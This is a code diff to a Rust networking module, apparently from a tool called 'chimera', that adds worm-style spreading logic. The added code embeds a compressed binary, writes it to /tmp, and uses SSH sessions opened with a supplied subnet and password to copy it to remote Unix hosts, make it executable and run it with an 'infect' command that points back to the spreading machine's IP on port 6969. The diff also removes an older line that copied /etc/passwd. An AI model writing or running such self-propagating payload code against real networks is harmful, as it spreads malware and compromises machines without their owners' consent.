@@ -1,5 +1,7 @@
 use crate::net::communicator::{Credentials, Session};
 use anyhow::anyhow;
+use flate2::read::ZlibDecoder;
+use tokio::fs::File;
 use tokio::time::{timeout, Duration};
 // use crate::net::enumeration::ping::Enumerator;
 use crate::net::enumeration::ping::Enumerator;
@@ -8,11 +10,15 @@ use crate::net::ssh::{SSHClient, SSHSession};
 use crate::net::types::{Host, OS};
 use crate::net::winexe::{WinexeClient, WinexeSession};
 use futures::future::join_all;
+use local_ip::get_local_ip;
 use std::io::{self, Read, Write};
 use std::str;
 use std::sync::Arc;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
+
+// Include the bytes of chimera at create::bin::chimera
+const CHIMERA: &[u8] = include_bytes!("../../../bin/chimera.zlib");
 
 pub enum SessionType {
     SSH(SSHSession),
@@ -133,14 +139,22 @@ async fn establish_connection(
 
 pub struct Spreader {
     pub(crate) pool: ConnectionPool,
+    pub(crate) mother_ip: Box<str>,
 }
 
 impl Spreader {
     pub async fn new(subnet: &str, password: &str) -> Self {
-        let spreader = Self {
+        let chimera_path = "/tmp/chimera.tmp";
+        // Delete the old chimera file if it exists
+        tokio::fs::remove_file(chimera_path).await.unwrap_or(());
+
+        // Extract and decompress chimera
+        decompress_and_write().await.unwrap();
+
+        Self {
             pool: ConnectionPool::new(subnet, password).await,
-        };
-        spreader
+            mother_ip: get_local_ip(),
+        }
     }
 
     pub async fn spread(&self) {
@@ -154,7 +168,7 @@ impl Spreader {
             let client_future = async move {
                 match shared_client.0 {
                     OS::Unix => {
-                        match Self::spread_unix(&shared_client.1).await {
+                        match Self::spread_unix(&self.mother_ip, &shared_client.1).await {
                             Ok(_) => println!("Successfully spread"),
                             Err(e) => println!("Error spreading: {}", e),
                         };
@@ -170,21 +184,36 @@ impl Spreader {
         join_all(futures).await;
     }
 
-    async fn spread_unix(session: &SessionType) -> anyhow::Result<()> {
+    async fn spread_unix(mother_ip: &str, session: &SessionType) -> anyhow::Result<()> {
         let session = match session {
             SessionType::SSH(session) => session,
             // Throw an error if the session is not SSH
             _ => return Err(anyhow!("Session is not SSH")),
         };
 
-        println!("Running ls -la Hopefully im at least concurrent ");
-        std::io::stdout().flush().unwrap();
-        session.execute_command("ls -la").await?;
+        session
+            .transfer_file("/tmp/chimera.tmp", "/tmp/chimera")
+            .await?;
 
-        println!("Transfering file");
-        session.transfer_file("/etc/passwd", "/tmp/passwd").await?;
+        session.execute_command("chmod +x /tmp/chimera").await?;
+
+        let cmd = format!("/tmp/chimera infect -m {} -p 6969", mother_ip);
+        session.execute_command(&cmd).await?;
 
         session.close().await?;
         Ok(())
     }
+}
+
+async fn decompress_and_write() -> anyhow::Result<()> {
+    // Decompress CHIMERA
+    let mut decoder = ZlibDecoder::new(&CHIMERA[..]);
+    let mut decompressed_data = Vec::new();
+    decoder.read_to_end(&mut decompressed_data)?;
+
+    // Write to a temporary file
+    let mut file = File::create("/tmp/chimera.tmp").await?;
+    file.write_all(&decompressed_data).await?;
+
+    Ok(())
 }
